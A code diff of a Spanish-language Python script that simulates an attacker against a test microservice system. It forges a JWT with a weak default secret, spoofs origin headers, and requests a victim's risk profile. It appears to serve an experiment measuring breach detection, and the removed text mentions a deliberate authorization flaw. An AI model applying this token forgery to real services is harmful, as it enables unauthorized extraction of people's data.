@@ -1,12 +1,10 @@
 """Escenario 1 — Confidencialidad (ASR1).
 
-Simula al atacante: forja un token de sesión (PyJWT, mismo `JWT_SECRET` que
-`ms-identidad`) para pedirle a `ms-cliente` el perfil de riesgo de una
-víctima. El token es válido (firma correcta, `customer_id` existente) pero
-pertenece a otro cliente — `ms-identidad` no compara `customer_id` del token
-contra el `customer_id` solicitado (BOLA deliberado, ver
-`../ms-identidad/README.md`), así que la extracción no autorizada se
-completa igual.
+Simula al atacante: forja/manipula un token de sesión (PyJWT) para pedirle a
+ms-cliente el perfil de riesgo de una víctima sin pasar por el flujo normal
+de ms-identidad, incluyendo datos dummy del atacante (IP/device/país
+simulados — no GeoIP real, ver decisión documentada en el diseño del
+experimento).
 """
 import os
 from datetime import datetime
@@ -14,59 +12,65 @@ from datetime import datetime
 import jwt
 import requests
 
-MS_CLIENTE_URL = os.getenv("MS_CLIENTE_URL", "http://localhost:6002")
-PERFIL_PATH = "/perfil-riesgo"
+MS_CLIENTE_URL = os.getenv("MS_CLIENTE_URL", "http://localhost:5000")
+PERFIL_PATH_TEMPLATE = "/perfiles/{customer_id}"
+# TODO: reemplazar por el secreto real de ms-identidad una vez implementado
+# (o dejar deliberadamente uno robado/filtrado, según el mecanismo final que
+# defina el equipo para materializar el bypass).
 JWT_SECRET = os.getenv("JWT_SECRET", "change-me")
 
 ATACANTE = {
-    "customer_id": os.getenv("ATACANTE_CUSTOMER_ID", "CLI-0002"),
     "ip": "1.2.3.4",  # dummy — simula origen desde un país sancionado
     "device": "unknown-device",
     "pais": "IR",
 }
 
 
-def forjar_token(customer_id_atacante: str) -> str:
-    return jwt.encode({"customer_id": customer_id_atacante}, JWT_SECRET, algorithm="HS256")
+def forjar_token(customer_id_victima: str) -> str:
+    payload = {"sub": "atacante", "customer_id": customer_id_victima}
+    return jwt.encode(payload, JWT_SECRET, algorithm="HS256")
 
 
 def ejecutar_ataque(customer_id_victima: str):
-    token = forjar_token(ATACANTE["customer_id"])
+    token = forjar_token(customer_id_victima)
     ataque_enviado_en = datetime.now()
-    body = {
-        "token": token,
-        "customer_id": customer_id_victima,
-        "ip": ATACANTE["ip"],
-        "device": ATACANTE["device"],
-        "pais": ATACANTE["pais"],
+    endpoint = (
+        f"{MS_CLIENTE_URL}"
+        f"{PERFIL_PATH_TEMPLATE.format(customer_id=customer_id_victima)}"
+    )
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "X-Forwarded-For": ATACANTE["ip"],
+        "X-Device-Id": ATACANTE["device"],
+        "X-Country": ATACANTE["pais"],
     }
 
-    respuesta = requests.post(f"{MS_CLIENTE_URL}{PERFIL_PATH}", json=body, timeout=10)
+    respuesta = requests.post(endpoint, headers=headers, timeout=10)
 
     print(f"Ataque enviado: {ataque_enviado_en.isoformat(timespec='seconds')}")
-    print(
-        f"Token forjado para customer_id_token={ATACANTE['customer_id']} "
-        f"pidiendo customer_id_solicitado={customer_id_victima}"
-    )
 
+    extraccion_exitosa = False
     try:
         payload = respuesta.json()
+        extraccion_exitosa = respuesta.status_code == 200 and bool(payload)
     except ValueError:
         payload = respuesta.text
 
-    extraccion_exitosa = respuesta.status_code == 200 and bool(payload)
     print(f"HTTP status: {respuesta.status_code}")
     print(f"Extraccion exitosa: {'si' if extraccion_exitosa else 'no'}")
     if extraccion_exitosa:
         print(f"Datos extraidos: {payload}")
 
+    print("Medicion deteccion/notificacion: manual")
     print(
-        "Evidencia: GET "
-        f"http://localhost:6004/incidentes (ms-audit) o "
-        "'docker compose logs -f ms-audit ms-notificaciones' para el "
-        "tiempo de deteccion (ASR1, <200ms) y de notificacion (ASR3, <5s)."
+        "No existe todavia un endpoint o consulta automatizable en el "
+        "scaffold para confirmar el incidente desde este script."
+    )
+    print(
+        "Mide manualmente el tiempo desde la marca 'Ataque enviado' hasta "
+        "que ms-audit o ms-notificaciones registren el incidente en consola."
     )
 
 
 if __name__ == "__main__":
-    ejecutar_ataque(customer_id_victima=os.getenv("VICTIMA_CUSTOMER_ID", "CLI-0001"))
+    ejecutar_ataque(customer_id_victima="CLI-0001")
